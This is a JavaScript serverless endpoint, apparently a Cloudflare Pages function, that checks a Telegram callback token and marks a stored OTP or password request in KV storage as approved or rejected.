import { makeJsonResponse, makeTextResponse, getRequestFromKV, setRequestInKV } from "../_shared.js";

async function applyAction(env, requestId, action) {
  // Try OTP first, then password
  let item = await getRequestFromKV(env, requestId, "otp");
  let type = "otp";
  
  if (!item) {
    item = await getRequestFromKV(env, requestId, "password");
    type = "password";
  }

  if (!item) return false;

  if (action === "approve") {
    item.approved = true;
    item.rejectedReason = null;
  } else if (action === "reject") {
    item.rejectedReason = "Admin rejected the request";
    item.approved = false;
  }
  
  await setRequestInKV(env, requestId, item, type);
  return true;
}

export async function onRequest(context) {
  const { request, env } = context;
  const url = new URL(request.url);

  if (request.method === "OPTIONS") return makeTextResponse("", 204);

  let requestId, action, token;

  if (request.method === "GET") {
    requestId = url.searchParams.get("requestId");
    action = url.searchParams.get("action");
    token = url.searchParams.get("token");
  } else if (request.method === "POST") {
    try {
      const body = await request.json();
      requestId = body.requestId;
      action = body.action;
      token = body.token;
    } catch (e) {
      return makeJsonResponse({ error: "Invalid JSON" }, 400);
    }
  } else {
    return makeJsonResponse({ error: "Method not allowed" }, 405);
  }

  if (token !== env.TELEGRAM_CALLBACK_TOKEN) {
    return makeTextResponse("<h3>Invalid token</h3>", 401);
  }

  const success = await applyAction(env, requestId, action);
  if (!success) return makeTextResponse("<h3>Request not found</h3>", 404);

  if (request.method === "GET") {
    return makeTextResponse(`<h3>Request ${action === "approve" ? "Approved ✅" : "Rejected ❌"}</h3>`);
  }
  return makeJsonResponse({ success: true });
}